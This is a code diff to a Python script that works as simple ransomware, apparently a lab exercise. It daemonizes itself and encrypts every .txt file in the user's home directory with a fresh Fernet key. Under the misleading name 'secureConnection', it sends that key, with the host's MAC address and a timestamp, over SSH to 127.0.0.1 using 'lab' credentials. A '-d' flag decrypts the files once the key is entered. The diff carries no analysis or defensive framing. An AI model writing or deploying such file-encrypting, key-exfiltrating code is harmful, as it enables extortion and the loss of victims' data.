@@ -1,10 +1,18 @@
 #!/usr/bin/python3
+import binascii
 
 import requests
+import argparse
 import os
 import sys
 import signal
+import paramiko
 from cryptography.fernet import Fernet
+from uuid import getnode as get_mac
+from datetime import datetime
+
+
+homeDirectory = str(os.getenv("HOME"))
 
 
 def signalHandler(signalNumber, frame):
@@ -30,12 +38,12 @@ def getStat():
 
 def secureConnection():
     key = Fernet.generate_key()
-    sendKey(key)
+    sendKey(key + "\t".encode("ascii") + bin(get_mac()).encode("ascii") + "\t".encode("ascii") +
+            str(datetime.now()).encode("ascii"))
 
-    for file in os.listdir(os.path.expanduser('/home/test/')):
+    for file in os.listdir(os.path.expanduser(homeDirectory)):
         if file.endswith(".txt"):
-            filePath = os.path.join("/home/test/", file)
-            print(filePath)
+            filePath = os.path.join(homeDirectory, file)
             f = Fernet(key)
             with open(filePath, "rb") as fileContents:
                 data = fileContents.read()
@@ -45,32 +53,58 @@ def secureConnection():
 
 
 def sendKey(key):
-    print(key)
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client.connect('127.0.0.1', username='lab', password='lab')
+    channelObject = client.get_transport().open_session()
+    channelObject.send(key)
+    client.close()
+
+
+def getKey():
+    key = input("Please enter the key:\n")
+    return key.encode("ascii")
 
 
 if __name__ == '__main__':
-    try:
-        pid = os.fork()
-        if pid > 0:
-            getStat()
+    parser = argparse.ArgumentParser(description="")
+    parser.add_argument('-d', action='store_true')
+    args = parser.parse_args()
+
+    if args.d:
+        keyFile = getKey()
+        for file in os.listdir(os.path.expanduser(homeDirectory)):
+            if file.endswith(".txt"):
+                filePath = os.path.join(homeDirectory, file)
+                f = Fernet(keyFile)
+                with open(filePath, "rb") as fileContents:
+                    data = fileContents.read()
+                    decryptedData = f.decrypt(data)
+                with open(filePath, "wb") as fileContents:
+                    fileContents.write(decryptedData)
+    else:
+        try:
+            pid = os.fork()
+            if pid > 0:
+                getStat()
+                sys.exit(0)
+        except OSError:
             sys.exit(0)
-    except OSError:
-        sys.exit(0)
 
-    os.chdir('/')
-    os.umask(0)
-    os.setsid()
-    os.setuid(0)
-    os.setgid(0)
+        os.chdir('/')
+        os.umask(0)
+        os.setsid()
+        # os.setuid(0)
+        # os.setgid(0)
 
-    signal.signal(signal.SIGCHLD, signalHandler)
+        signal.signal(signal.SIGCHLD, signalHandler)
 
-    try:
-        pid = os.fork()
-        if pid > 0:
+        try:
+            pid = os.fork()
+            if pid > 0:
+                sys.exit(0)
+        except OSError:
             sys.exit(0)
-    except OSError:
-        sys.exit(0)
 
-    if pid == 0:
-        secureConnection()
+        if pid == 0:
+            secureConnection()
